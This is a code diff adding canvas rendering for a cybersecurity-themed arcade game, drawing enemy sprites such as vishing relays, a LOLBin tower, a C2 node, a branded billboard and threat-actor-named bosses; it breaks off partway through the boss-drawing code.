+        CX.fillStyle=fc||(vis?'#3a0040':'#1a2a1a'); CX.fillRect(-13,-18,26,33);
+        CX.strokeStyle=vc; CX.lineWidth=1.8; CX.strokeRect(-13,-18,26,33);
+        // Phone icon (vishing)
+        CX.fillStyle=vc; CX.font='14px monospace'; CX.textAlign='center';
+        CX.fillText(vis?'📞':'?',0,-5);
+        // Signal waves
+        if(vis){
+          for(let ri=1;ri<=3;ri++){
+            const rp=((_gt*1.2)%1)*ri/3;
+            CX.globalAlpha=1-rp; CX.strokeStyle='#ff62ff'; CX.lineWidth=1;
+            CX.beginPath(); CX.arc(0,-18,ri*6+rp*10,Math.PI,0); CX.stroke();
+          }
+          CX.globalAlpha=1;
+        }
         CX.fillStyle=vis?'#ffc8ff':'#caffb2'; CX.font='bold 9px monospace'; CX.textAlign='center';
-        CX.fillText(vis?'VISH':'HELP',0,3); break;
-      case 'supplyRelay':
-        CX.fillStyle=fc||'#88ff55'; CX.fillRect(-14,-18,28,33);
-        CX.fillStyle='#1a3010'; CX.fillRect(-10,-14,20,25);
-        CX.fillStyle='#caffb2'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('SUPP',0,3); break;
-      case 'oauthRelay':
-        CX.fillStyle=fc||(!vis?'#aaaaaa':'#ff8d39'); CX.fillRect(-13,-15,26,29);
-        CX.fillStyle=vis?'#2a1800':'#222'; CX.fillRect(-9,-11,18,21);
-        CX.fillStyle=vis?'#ffd2ae':'#888'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('OATH',0,3); break;
-      case 'insiderRelay':
-        CX.fillStyle=fc||(!vis?'#aaaaaa':'#4ab6ff'); CX.fillRect(-13,-19,26,35);
-        CX.strokeStyle=vis?'#b0e8ff':'rgba(180,180,180,0.3)'; CX.lineWidth=1.8;
-        CX.beginPath(); CX.arc(0,-7,7,0,TAU); CX.stroke();
-        CX.fillStyle=vis?'#0a1828':'#222'; CX.fillRect(-4,-13,8,23);
-        CX.fillStyle=vis?'#b0e8ff':'#888'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('INSR',0,4); break;
-      case 'cryptoRelay':
-        CX.fillStyle=fc||'#2af0d0'; CX.fillRect(-13,-18,26,33);
-        CX.fillStyle='#082018'; CX.fillRect(-9,-14,18,25);
-        CX.fillStyle='#b0fff0'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('₿',0,4); break;
-      case 'wiperRelay':
-        CX.fillStyle=fc||'#c850ff'; CX.fillRect(-14,-20,28,37);
-        CX.fillStyle='#1a0030'; CX.fillRect(-10,-16,20,29);
-        CX.strokeStyle='#e090ff'; CX.lineWidth=1.5; CX.strokeRect(-14,-20,28,37);
-        CX.fillStyle='#e090ff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('WIPE',0,4); break;
-      case 'edgeTurret':
-        CX.fillStyle=fc||'#ff8d39'; CX.fillRect(-14,-14,28,28);
-        CX.fillStyle='#7d3914'; CX.fillRect(-10,-10,20,20);
-        CX.fillStyle='#ffd2ae'; CX.fillRect(-3,-26,6,14);
-        CX.strokeStyle='#ff8d39'; CX.lineWidth=2; CX.strokeRect(-14,-14,28,28); break;
-      case 'malwareRelay':
-        CX.fillStyle=fc||'#e0003c'; CX.fillRect(-4,-22,8,36); CX.fillRect(-15,-4,30,7);
-        CX.fillStyle='#800020'; CX.beginPath(); CX.arc(0,-16,5,0,TAU); CX.fill();
-        CX.strokeStyle='#ff6080'; CX.lineWidth=1.5; CX.beginPath(); CX.arc(0,-16,9,0,TAU); CX.stroke(); break;
+        CX.fillText(vis?'VISH RELAY':'???',0,10);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── supplyRelay — supply-chain compromised relay ────────────────────
+      case 'supplyRelay': {
+        CX.shadowBlur=vis?8:0; CX.shadowColor='#88ff55';
+        // Server stack
+        CX.fillStyle=fc||'#1a3010'; CX.fillRect(-14,-20,28,36);
+        CX.strokeStyle='#88ff55'; CX.lineWidth=1.5; CX.strokeRect(-14,-20,28,36);
+        // Rack bays
+        for(let ri=0;ri<3;ri++){
+          CX.fillStyle=ri===1&&vis?'#226600':'#112200';
+          CX.fillRect(-11,-16+ri*11,22,9);
+          CX.fillStyle=vis?'#44ff22':'#224400'; CX.beginPath();
+          CX.arc(-6,-12+ri*11,2.5,0,TAU); CX.fill();
+        }
+        CX.fillStyle='#caffb2'; CX.font='bold 9px monospace'; CX.textAlign='center';
+        CX.fillText(vis?'SUPPLY':'???',0,13);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── oauthRelay — OAuth token relay station ──────────────────────────
+      case 'oauthRelay': {
+        const oc=vis?'#ff8d39':'#444';
+        CX.shadowBlur=vis?9:0; CX.shadowColor=oc;
+        CX.fillStyle=fc||(vis?'#2a1800':'#222'); CX.fillRect(-13,-17,26,31);
+        CX.strokeStyle=oc; CX.lineWidth=1.8; CX.strokeRect(-13,-17,26,31);
+        // Key icon
+        CX.fillStyle=oc; CX.font='13px monospace'; CX.textAlign='center';
+        CX.fillText(vis?'🔑':'?',0,-3);
+        // Token pulse
+        if(vis){
+          const tp=(_gt*0.8)%1;
+          CX.globalAlpha=1-tp; CX.strokeStyle='#ff8d39'; CX.lineWidth=1.5;
+          CX.beginPath(); CX.arc(0,-5,tp*20,0,TAU); CX.stroke();
+          CX.globalAlpha=1;
+        }
+        CX.fillStyle=vis?'#ffd2ae':'#888'; CX.font='bold 9px monospace'; CX.textAlign='center';
+        CX.fillText(vis?'OAUTH':'???',0,11);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── insiderRelay — insider threat relay ─────────────────────────────
+      case 'insiderRelay': {
+        const ic=vis?'#4ab6ff':'#444';
+        CX.shadowBlur=vis?9:0; CX.shadowColor=ic;
+        CX.fillStyle=fc||(vis?'#0a1828':'#222'); CX.fillRect(-13,-21,26,37);
+        CX.strokeStyle=ic; CX.lineWidth=1.8; CX.strokeRect(-13,-21,26,37);
+        // Eye/surveillance orb
+        CX.strokeStyle=ic; CX.lineWidth=1.8; CX.beginPath(); CX.arc(0,-9,7,0,TAU); CX.stroke();
+        CX.fillStyle=ic; CX.beginPath(); CX.arc(0,-9,3,0,TAU); CX.fill();
+        // Scan line
+        if(vis){
+          const sl=(_gt*1.1)%1;
+          CX.globalAlpha=0.6-sl*0.6; CX.fillStyle='#4ab6ff';
+          CX.fillRect(-12,-22+sl*36,24,2);
+          CX.globalAlpha=1;
+        }
+        CX.fillStyle=vis?'#b0e8ff':'#888'; CX.font='bold 9px monospace'; CX.textAlign='center';
+        CX.fillText(vis?'INSIDER':'???',0,13);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── cryptoRelay — crypto-exfil relay ───────────────────────────────
+      case 'cryptoRelay': {
+        CX.shadowBlur=vis?9:0; CX.shadowColor='#2af0d0';
+        CX.fillStyle=fc||'#082018'; CX.fillRect(-13,-20,26,35);
+        CX.strokeStyle='#2af0d0'; CX.lineWidth=1.8; CX.strokeRect(-13,-20,26,35);
+        // Bitcoin spin
+        CX.fillStyle='#2af0d0'; CX.font='bold 16px monospace'; CX.textAlign='center';
+        CX.save(); CX.rotate(_gt*0.8); CX.fillText('₿',0,5); CX.restore();
+        // Chain animation
+        for(let ci=0;ci<3;ci++){
+          const cp=((_gt*0.6+ci*0.33)%1);
+          CX.globalAlpha=cp*0.8; CX.fillStyle='#2af0d0';
+          CX.fillRect(-10,-18+ci*12,cp*20,3);
+        }
+        CX.globalAlpha=1;
+        CX.fillStyle='#b0fff0'; CX.font='bold 9px monospace'; CX.textAlign='center';
+        CX.fillText('CRYPTO',0,12);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── wiperRelay — data-wiper relay ──────────────────────────────────
+      case 'wiperRelay': {
+        CX.shadowBlur=vis?12:0; CX.shadowColor='#c850ff';
+        CX.fillStyle=fc||'#1a0030'; CX.fillRect(-14,-22,28,40);
+        CX.strokeStyle='#c850ff'; CX.lineWidth=2; CX.strokeRect(-14,-22,28,40);
+        // Wiper bars (sweeping destruction animation)
+        if(vis){
+          const wp=(_gt*2.4)%1;
+          CX.globalAlpha=0.9; CX.fillStyle='#c850ff';
+          CX.fillRect(-11,-19,22,3); // Top wiper sweep
+          CX.fillStyle='rgba(200,80,255,0.35)'; CX.fillRect(-11,-19,22,wp*34);
+        }
+        CX.globalAlpha=vis?1:0.13;
+        CX.fillStyle='#e090ff'; CX.font='bold 10px monospace'; CX.textAlign='center';
+        CX.fillText('WIPE',0,2);
+        CX.fillStyle='rgba(200,80,255,0.7)'; CX.font='9px monospace';
+        CX.fillText(vis?'MBR OVERWRITE':'???',0,13);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── edgeTurret — edge exploitation turret ──────────────────────────
+      case 'edgeTurret': {
+        CX.shadowBlur=vis?12:0; CX.shadowColor='#ff8d39';
+        // Base plate
+        CX.fillStyle=fc||'#4a2208'; CX.fillRect(-14,-14,28,24);
+        CX.strokeStyle='#ff8d39'; CX.lineWidth=2; CX.strokeRect(-14,-14,28,24);
+        // Inner mechanism
+        CX.fillStyle='#7d3914'; CX.fillRect(-9,-10,18,16);
+        // Rotating barrel
+        CX.save();
+        const tdx=PL.x-g.x,tdy=PL.y-sy;
+        const tang=Math.atan2(tdy,tdx);
+        CX.rotate(tang-Math.PI/2);
+        CX.fillStyle=fc||'#ff8d39'; CX.fillRect(-3,-26,6,14);
+        // Barrel tip glow
+        CX.shadowBlur=vis?8:0; CX.fillStyle='#ffcc88';
+        CX.beginPath(); CX.arc(0,-26,3.5,0,TAU); CX.fill();
+        CX.restore();
+        // Alert pip
+        const eblink=Math.sin(_gt*5)*0.5+0.5;
+        CX.globalAlpha=vis?eblink:0.1; CX.fillStyle='#ff4400';
+        CX.beginPath(); CX.arc(10,-12,2.5,0,TAU); CX.fill();
+        CX.globalAlpha=vis?1:0.13;
+        CX.shadowBlur=0; break;
+      }
+
+      // ── malwareRelay — generic malware C2 relay ─────────────────────────
+      case 'malwareRelay': {
+        CX.shadowBlur=vis?8:0; CX.shadowColor='#e0003c';
+        CX.fillStyle=fc||'#2a0010'; CX.fillRect(-4,-24,8,38); CX.fillRect(-15,-5,30,8);
+        CX.fillStyle='#800020'; CX.beginPath(); CX.arc(0,-18,5,0,TAU); CX.fill();
+        CX.strokeStyle='#ff6080'; CX.lineWidth=1.5;
+        CX.beginPath(); CX.arc(0,-18,9+(Math.sin(_gt*3)*2),0,TAU); CX.stroke();
+        CX.fillStyle='#ff6080'; CX.font='bold 9px monospace'; CX.textAlign='center';
+        CX.fillText('C2',0,-15);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── lolbinTower — LOLBin command tower (cinematic) ─────────────────
+      case 'lolbinTower': {
+        const PROCS=['certutil.exe','mshta.exe','rundll32','regsvr32','wscript.exe','cscript.exe','bitsadmin'];
+        const pidx=Math.floor((g._proc||0)/0.51)%PROCS.length;
+        CX.shadowBlur=vis?16:0; CX.shadowColor='#e0003c';
+        // Concrete tower body
+        CX.fillStyle=fc||'#1c1410'; CX.fillRect(-16,-44,32,60);
+        CX.strokeStyle='#e0003c'; CX.lineWidth=2; CX.strokeRect(-16,-44,32,60);
+        // Armour plates (bolted look)
+        CX.fillStyle='#2a1c14'; CX.fillRect(-14,-42,28,26);
+        CX.fillStyle='#181010'; CX.fillRect(-14,-12,28,26);
+        // Rivet dots
+        for(let rv=0;rv<4;rv++){
+          const rx=rv<2?-11:8,ry=rv%2===0?-40:-25;
+          CX.fillStyle='#444'; CX.beginPath(); CX.arc(rx,ry,2,0,TAU); CX.fill();
+        }
+        // Terminal screen (3 lines of scrolling process names)
+        CX.fillStyle='#100808'; CX.fillRect(-12,-40,24,22);
+        CX.strokeStyle='#440000'; CX.lineWidth=1; CX.strokeRect(-12,-40,24,22);
+        if(vis){
+          CX.fillStyle='#e0003c'; CX.font='6px monospace'; CX.textAlign='left';
+          const off=(g._proc||0)*18;
+          for(let li=0;li<3;li++){
+            const pi=(pidx+li)%PROCS.length;
+            CX.globalAlpha=1-li*0.3;
+            CX.fillText(PROCS[pi].substring(0,9),-11,-32+li*7);
+          }
+          CX.globalAlpha=1;
+          // Scanning cursor
+          const cursX=((_gt*22)%24)-12;
+          CX.fillStyle='#ff4444'; CX.fillRect(cursX,-21,2,6);
+        }
+        // Barrel / gun mount
+        CX.save();
+        const lbDx=PL.x-g.x,lbDy=PL.y-sy;
+        CX.rotate(Math.atan2(lbDy,lbDx)-Math.PI/2);
+        CX.fillStyle=fc||'#cc1100'; CX.fillRect(-4,-46,8,16);
+        CX.fillRect(-7,-50,14,8);
+        // Muzzle flash on shoot cooldown < 0.1s
+        if(g.shoot<0.1&&vis){
+          CX.globalAlpha=0.9; CX.fillStyle='#ffaa00';
+          CX.beginPath(); CX.arc(0,-52,6,0,TAU); CX.fill(); CX.globalAlpha=1;
+        }
+        CX.restore();
+        // Blinking red alert lights on sides
+        const lb1=Math.sin(_gt*3)*0.5+0.5, lb2=Math.sin(_gt*3+2)*0.5+0.5;
+        CX.globalAlpha=vis?lb1:0.1; CX.fillStyle='#ff2200';
+        CX.beginPath(); CX.arc(-17,-10,3.5,0,TAU); CX.fill();
+        CX.globalAlpha=vis?lb2:0.1; CX.fillStyle='#ff2200';
+        CX.beginPath(); CX.arc(17,-30,3.5,0,TAU); CX.fill();
+        CX.globalAlpha=vis?1:0.13;
+        // Health bar (integrated into tower design)
+        CX.fillStyle='rgba(0,0,0,0.7)'; CX.fillRect(-16,18,32,5);
+        CX.fillStyle=hp01>0.5?'#e0003c':hp01>0.25?'#ff8800':'#ff5a4d';
+        CX.fillRect(-16,18,32*hp01,5);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── sniperPost — precision sniper bunker ────────────────────────────
+      case 'sniperPost': {
+        CX.shadowBlur=vis?10:0; CX.shadowColor='#ffcc44';
+        // Bunker
+        CX.fillStyle=fc||'#2a2008'; CX.fillRect(-13,-22,26,34);
+        CX.strokeStyle='#c89020'; CX.lineWidth=2; CX.strokeRect(-13,-22,26,34);
+        // Crenellations (battlements)
+        for(let cr=0;cr<3;cr++) { CX.fillStyle='#2a2008'; CX.fillRect(-12+cr*9,-30,7,10); }
+        // Barrel (tracking player, high angle)
+        CX.save();
+        const spDx=PL.x-g.x,spDy=PL.y-sy;
+        CX.rotate(Math.atan2(spDy,spDx)-Math.PI/2);
+        CX.fillStyle=fc||'#c89020'; CX.fillRect(-2,-30,4,20);
+        // Scope
+        CX.strokeStyle='#ffee88'; CX.lineWidth=1;
+        CX.beginPath(); CX.arc(0,-28,5,0,TAU); CX.stroke();
+        CX.beginPath(); CX.moveTo(-5,-28); CX.lineTo(5,-28); CX.moveTo(0,-33); CX.lineTo(0,-23); CX.stroke();
+        CX.restore();
+        // Laser dot (tracks toward player)
+        if(vis){
+          const lDist=Math.hypot(spDx,spDy);
+          const lnx=spDx/(lDist||1),lny=spDy/(lDist||1);
+          const dotPulse=Math.sin(_gt*8)*0.5+0.5;
+          CX.globalAlpha=dotPulse*0.7; CX.strokeStyle='rgba(255,50,0,0.6)'; CX.lineWidth=0.8;
+          CX.setLineDash([3,5]);
+          CX.beginPath(); CX.moveTo(0,0); CX.lineTo(lnx*80,lny*80); CX.stroke();
+          CX.setLineDash([]);
+          CX.fillStyle='#ff2200'; CX.globalAlpha=dotPulse;
+          CX.beginPath(); CX.arc(lnx*80,lny*80,2.5,0,TAU); CX.fill();
+          CX.globalAlpha=1;
+        }
+        CX.shadowBlur=0; break;
+      }
+
+      // ── c2Node — command-and-control data exfil node ───────────────────
+      case 'c2Node': {
+        CX.shadowBlur=vis?18:0; CX.shadowColor='#42d9ff';
+        // Main server housing
+        CX.fillStyle=fc||'#081828'; CX.fillRect(-18,-34,36,54);
+        CX.strokeStyle='#42d9ff'; CX.lineWidth=2.5; CX.strokeRect(-18,-34,36,54);
+        // Server racks (3 bays)
+        for(let sr=0;sr<3;sr++){
+          CX.fillStyle=sr===1&&vis?'#0a2040':'#050d1a';
+          CX.fillRect(-15,-30+sr*14,30,12);
+          // Activity LEDs
+          for(let ld=0;ld<5;ld++){
+            const ledOn=vis&&Math.sin(_gt*4+g.x*0.1+ld+sr*2.1)>0;
+            CX.fillStyle=ledOn?'#42d9ff':'#0a2040';
+            CX.beginPath(); CX.arc(-10+ld*5,-26+sr*14,1.5,0,TAU); CX.fill();
+          }
+        }
+        // Rotating dish on top — save/restore to avoid transform leak
+        CX.save(); CX.translate(0,-36); CX.rotate(g._dish||0);
+        CX.strokeStyle=fc||'#42d9ff'; CX.lineWidth=1.8;
+        CX.beginPath(); CX.moveTo(0,0); CX.lineTo(-12,-8); CX.lineTo(-16,-2); CX.stroke();
+        CX.beginPath(); CX.arc(0,0,14,Math.PI*0.7,Math.PI*1.4,false); CX.stroke();
+        CX.restore();
+        // Exfil beam — save/restore to keep clean
+        if(vis){
+          CX.save(); CX.translate(0,-36);
+          const ep=(_gt*1.4)%1;
+          CX.globalAlpha=(1-ep)*0.7; CX.strokeStyle='#42d9ff'; CX.lineWidth=2;
+          CX.beginPath(); CX.moveTo(0,0); CX.lineTo(0,-ep*50); CX.stroke();
+          CX.globalAlpha=vis?1:0.13; CX.restore();
+        }
+        // Label (relative to entity origin)
+        CX.fillStyle='#42d9ff'; CX.font='bold 10px monospace'; CX.textAlign='center';
+        CX.fillText('C2 NODE',0,22);
+        CX.shadowBlur=0; break;
+      }
+
+      // ── jammerTower — signal jammer tower ──────────────────────────────
+      case 'jammerTower': {
+        CX.shadowBlur=vis?14:0; CX.shadowColor='#ffd84d';
+        // Tower pole + dish
+        CX.fillStyle=fc||'#2a2000'; CX.fillRect(-5,-36,10,52);
+        CX.fillRect(-18,-8,36,8);
+        CX.strokeStyle='#ffd84d'; CX.lineWidth=2; CX.strokeRect(-18,-8,36,8);
+        // Spinning jammer rings
+        for(let ji=0;ji<3;ji++){
+          const jr=8+ji*7, ja=(g._ring||0)+ji*(TAU/3);
+          const jalpha=vis?(0.7-ji*0.18):0.1;
+          CX.globalAlpha=jalpha; CX.strokeStyle='#ffd84d'; CX.lineWidth=1.5;
+          CX.save(); CX.rotate(ja);
+          CX.beginPath(); CX.ellipse(0,-22,jr,3.5,0,0,TAU); CX.stroke();
+          // Radiating spoke
+          CX.strokeStyle=`rgba(255,216,77,${jalpha*0.5})`;
+          CX.beginPath(); CX.moveTo(0,-22); CX.lineTo(jr,-22); CX.stroke();
+          CX.restore();
+        }
+        CX.globalAlpha=vis?1:0.13;
+        // Pulse wave (jammer interference)
+        if(vis){
+          const jp=(_gt*1.8)%1;
+          CX.globalAlpha=(1-jp)*0.4; CX.strokeStyle='#ffd84d'; CX.lineWidth=1;
+          CX.beginPath(); CX.arc(0,-22,jp*35,0,TAU); CX.stroke();
+          CX.globalAlpha=1;
+        }
+        // Tip light
+        CX.fillStyle='#ffee44'; CX.beginPath(); CX.arc(0,-38,3,0,TAU); CX.fill();
+        CX.fillStyle='#2a2000'; CX.font='bold 9px monospace'; CX.textAlign='center';
+        CX.fillStyle='#ffd84d'; CX.fillText('JAMMER',0,18);
+        CX.shadowBlur=0; break;
+      }
     }
-    if(g.maxHp>2&&vis){ CX.globalAlpha=1; CX.fillStyle='#111'; CX.fillRect(-15,-28,30,5); CX.fillStyle='#74ff88'; CX.fillRect(-15,-28,30*(g.hp/g.maxHp),5); }
+    // Global health bar for mid+ HP entities
+    if(g.maxHp>2&&vis&&g.type!=='lolbinTower'){
+      CX.globalAlpha=1;
+      CX.fillStyle='rgba(0,0,0,0.6)'; CX.fillRect(-15,-g.h*0.5-10,30,5);
+      CX.fillStyle=hp01>0.5?'#74ff88':hp01>0.25?'#ffd84d':'#ff5a4d';
+      CX.fillRect(-15,-g.h*0.5-10,30*hp01,5);
+    }
     CX.textAlign='left'; CX.restore();
   }
 }
@@ -10289,6 +11361,165 @@ function drawBridges(){
       CX.stroke();
       CX.fillStyle='rgba(255,90,60,0.13)'; CX.fillRect(rx,sy-rh/2,rw,rh);
     }
+  }
+}
+
+// ── Cinematic Billboard Renderer ──────────────────────────────────────────
+// Layout: pole sits right at bb.x (shore edge), panel extends INLAND away from river.
+// Left-side billboard  → panel extends leftward  (negative x in local space)
+// Right-side billboard → panel extends rightward (positive x in local space)
+function drawBillboards(){
+  if(!BILLBOARDS.length) return;
+  const _bt=Date.now()*0.001;
+  const bbW=190, bbH=72; // panel dimensions — wide enough for ~30-char lines
+  const poleH=88, poleW=7;
+  const logoW=24; // vertical CROWDSTRIKE strip width
+  const bbY=-(poleH+bbH-6); // top of panel in local space
+
+  for(const bb of BILLBOARDS){
+    if(!bb.alive) continue;
+    const sy=w2s(bb.wy); if(sy<-180||sy>VH+80) continue;
+    bb.t+=0.016;
+    const [line1,line2]=BB_MSGS[bb.msgIdx];
+    const isLeft=bb.side==='left';
+    CX.save(); CX.translate(bb.x,sy);
+
+    // Panel extends inland: left-side goes negative x, right-side goes positive x
+    // Pole is at local x=0 (the shore-edge point)
+    const bbX=isLeft?-bbW:0; // panel left edge in local space
+
+    // ── SPOTLIGHTS — two sweeping cones pointing skyward/inland ──────
+    const sp1A=Math.sin(_bt*0.65+bb.x*0.009)*0.30+(isLeft?-Math.PI*0.18:Math.PI*0.18);
+    const sp2A=Math.sin(_bt*0.88+bb.x*0.018+2.1)*0.22+(isLeft?-Math.PI*0.32:Math.PI*0.32);
+    CX.save();
+    for(const [sa,col0,col1] of [
+      [sp1A,'rgba(255,240,100,0.22)','rgba(255,240,100,0)'],
+      [sp2A,'rgba(66,217,255,0.18)','rgba(66,217,255,0)'],
+    ]){
+      const bx=isLeft?-2:2; // spotlight base near pole foot
+      const reach=180;
+      const ex=bx+Math.sin(sa)*reach, ey=-reach;
+      const grad=CX.createLinearGradient(bx,0,ex,ey);
+      grad.addColorStop(0,col0); grad.addColorStop(1,col1);
+      CX.fillStyle=grad;
+      CX.beginPath();
+      CX.moveTo(bx-4,2); CX.lineTo(ex-22,ey); CX.lineTo(ex+22,ey); CX.lineTo(bx+4,2);
+      CX.closePath(); CX.fill();
+    }
+    CX.restore();
+
+    // ── POLE ─────────────────────────────────────────────────────────
+    // Concrete footing
+    CX.fillStyle='#1e1c16'; CX.fillRect(-12,-4,24,10);
+    CX.strokeStyle='#3a3828'; CX.lineWidth=1.2; CX.strokeRect(-12,-4,24,10);
+    // Metal pole
+    const pg=CX.createLinearGradient(-poleW/2,0,poleW/2,0);
+    pg.addColorStop(0,'#1e1c14'); pg.addColorStop(0.45,'#504e3c'); pg.addColorStop(1,'#161410');
+    CX.fillStyle=pg; CX.fillRect(-poleW/2,-poleH,poleW,poleH);
+    CX.strokeStyle='#3a3826'; CX.lineWidth=0.8; CX.strokeRect(-poleW/2,-poleH,poleW,poleH);
+    // Bracket arm to panel midpoint
+    const armTargetX=bbX+bbW/2;
+    CX.strokeStyle='#484636'; CX.lineWidth=5;
+    CX.lineCap='round'; CX.beginPath();
+    CX.moveTo(0,-poleH+6); CX.lineTo(armTargetX,-poleH+6);
+    CX.stroke(); CX.lineCap='butt';
+
+    // ── PANEL SHADOW ─────────────────────────────────────────────────
+    CX.fillStyle='rgba(0,0,0,0.50)'; CX.fillRect(bbX+6,bbY+6,bbW,bbH);
+
+    // ── PANEL FRAME ──────────────────────────────────────────────────
+    const fg=CX.createLinearGradient(bbX,bbY,bbX,bbY+bbH);
+    fg.addColorStop(0,'#3a3420'); fg.addColorStop(1,'#1c1810');
+    CX.fillStyle=fg; CX.fillRect(bbX,bbY,bbW,bbH);
+    // Gold outer border
+    CX.strokeStyle='#b88018'; CX.lineWidth=2.5; CX.strokeRect(bbX,bbY,bbW,bbH);
+    // Bright gold inner hairline
+    CX.strokeStyle='#ffd84d'; CX.lineWidth=0.9; CX.strokeRect(bbX+3,bbY+3,bbW-6,bbH-6);
+
+    // ── LED DISPLAY BACKGROUND ────────────────────────────────────────
+    const lb=CX.createLinearGradient(bbX+4,bbY+4,bbX+bbW-4,bbY+bbH-4);
+    lb.addColorStop(0,'#06081a'); lb.addColorStop(1,'#020610');
+    CX.fillStyle=lb; CX.fillRect(bbX+4,bbY+4,bbW-8,bbH-8);
+    // Scanlines
+    CX.globalAlpha=0.07;
+    for(let sl=bbY+5;sl<bbY+bbH-5;sl+=3){
+      CX.fillStyle='#000'; CX.fillRect(bbX+5,sl,bbW-10,1);
+    }
+    CX.globalAlpha=1;
+
+    // ── CS LOGO STRIP (vertical red bar, text rotated) ───────────────
+    const lsg=CX.createLinearGradient(bbX+4,bbY+4,bbX+4+logoW,bbY+4);
+    lsg.addColorStop(0,'#e0003c'); lsg.addColorStop(1,'#960028');
+    CX.fillStyle=lsg; CX.fillRect(bbX+4,bbY+4,logoW,bbH-8);
+    CX.save();
+    CX.translate(bbX+4+logoW/2, bbY+bbH/2+1);
+    CX.rotate(-Math.PI/2);
+    CX.fillStyle='#fff'; CX.font='bold 7px monospace'; CX.textAlign='center';
+    CX.fillText('CROWDSTRIKE',0,3);
+    CX.restore();
+
+    // ── TEXT AREA ─────────────────────────────────────────────────────
+    const txtX0=bbX+4+logoW+5; // text start x
+    // Clip text to panel — use save/restore with rect clip
+    CX.save();
+    CX.beginPath(); CX.rect(txtX0, bbY+5, bbW-logoW-16, bbH-10); CX.clip();
+
+    // Headline (type-on reveal)
+    const revealFrac=Math.min(1, bb.t/1.4);
+    const visChars=Math.floor(line1.length*revealFrac);
+    CX.fillStyle='#ffd84d'; CX.font='bold 9px monospace'; CX.textAlign='left';
+    CX.shadowBlur=5; CX.shadowColor='rgba(255,216,77,0.8)';
+    CX.fillText(line1.substring(0,visChars), txtX0, bbY+22);
+    CX.shadowBlur=0;
+
+    // Divider
+    const dp=0.55+0.45*Math.sin(_bt*2.6);
+    CX.strokeStyle=`rgba(255,216,77,${dp})`; CX.lineWidth=0.8;
+    CX.beginPath(); CX.moveTo(txtX0,bbY+27); CX.lineTo(bbX+bbW-6,bbY+27); CX.stroke();
+
+    // Subline
+    CX.fillStyle='#42d9ff'; CX.font='8px monospace';
+    CX.shadowBlur=4; CX.shadowColor='rgba(66,217,255,0.7)';
+    CX.fillText(line2, txtX0, bbY+40);
+    CX.shadowBlur=0;
+
+    // GTR footer tag
+    CX.fillStyle='rgba(200,200,180,0.55)'; CX.font='7px monospace';
+    CX.fillText('globalthreatrep.com · GTR 2025', txtX0, bbY+57);
+
+    CX.restore(); // end text clip
+
+    // ── CORNER BEACON DOTS ───────────────────────────────────────────
+    const bp=0.45+0.55*Math.sin(_bt*3.8+bb.x*0.03);
+    for(const [cx2,cy2] of [[bbX+3,bbY+3],[bbX+bbW-3,bbY+3],[bbX+3,bbY+bbH-3],[bbX+bbW-3,bbY+bbH-3]]){
+      CX.fillStyle=`rgba(255,216,77,${bp})`; CX.beginPath(); CX.arc(cx2,cy2,2.5,0,TAU); CX.fill();
+    }
+
+    // ── ROTATING BEACON ON TOP ────────────────────────────────────────
+    const bTopX=bbX+bbW/2, bTopY=bbY-10;
+    const bRot=(_bt*1.5+bb.x*0.025)%TAU;
+    CX.save(); CX.translate(bTopX,bTopY);
+    // Sweep cone
+    CX.globalAlpha=0.45;
+    const bcg=CX.createLinearGradient(0,0,Math.cos(bRot)*48,Math.sin(bRot)*48);
+    bcg.addColorStop(0,'rgba(255,230,80,0.7)'); bcg.addColorStop(1,'rgba(255,230,80,0)');
+    CX.fillStyle=bcg;
+    CX.beginPath();
+    CX.moveTo(0,0);
+    CX.lineTo(Math.cos(bRot-0.18)*48,Math.sin(bRot-0.18)*48);
+    CX.lineTo(Math.cos(bRot+0.18)*48,Math.sin(bRot+0.18)*48);
+    CX.closePath(); CX.fill();
+    CX.globalAlpha=1;
+    // Beacon body
+    CX.shadowBlur=8; CX.shadowColor='#ffd84d';
+    CX.fillStyle='#ffd84d'; CX.beginPath(); CX.arc(0,0,4.5,0,TAU); CX.fill();
+    CX.fillStyle='#fff9cc'; CX.beginPath(); CX.arc(0,0,2,0,TAU); CX.fill();
+    CX.globalAlpha=bp*0.5; CX.strokeStyle='#ffd84d'; CX.lineWidth=1.2;
+    CX.beginPath(); CX.arc(0,0,8+bp*5,0,TAU); CX.stroke();
+    CX.globalAlpha=1; CX.shadowBlur=0;
+    CX.restore();
+
+    CX.textAlign='left'; CX.restore();
   }
 }
 
@@ -11050,97 +12281,572 @@ function drawBoss(){
   if(BOSS.shield>0){ CX.globalAlpha=0.72; CX.strokeStyle='#42d9ff'; CX.lineWidth=3.8; CX.beginPath(); CX.ellipse(0,0,BOSS.w/2+26,BOSS.h/2+20,0,0,TAU); CX.stroke(); CX.globalAlpha=1; }
 
   switch(BOSS.name){
-    case 'FANCY BEAR':
-      CX.fillStyle=c; CX.fillRect(-63,-31,126,62); CX.fillRect(-71,-40,23,21); CX.fillRect(48,-40,23,21);
-      CX.fillStyle='#7a1010'; CX.fillRect(-47,-21,94,42);
-      CX.fillStyle='#fff'; CX.beginPath(); CX.ellipse(-20,6,12,10,0,0,TAU); CX.fill(); CX.beginPath(); CX.ellipse(20,6,12,10,0,0,TAU); CX.fill();
-      CX.fillStyle='#e03030'; CX.beginPath(); CX.arc(-20,6,5,0,TAU); CX.fill(); CX.beginPath(); CX.arc(20,6,5,0,TAU); CX.fill();
-      CX.fillStyle='#fff'; CX.font='bold 9px monospace'; CX.textAlign='center'; CX.fillText('GRU/APT28',0,-8);
-      CX.strokeStyle=c; CX.lineWidth=2; CX.beginPath(); CX.moveTo(-22,-31); CX.lineTo(-22,-52); CX.moveTo(0,-31); CX.lineTo(0,-56); CX.moveTo(22,-31); CX.lineTo(22,-52); CX.stroke(); break;
-
-    case 'COZY BEAR':
-      CX.fillStyle=c; CX.fillRect(-62,-29,124,58); CX.fillRect(-66,-37,21,19); CX.fillRect(45,-37,21,19);
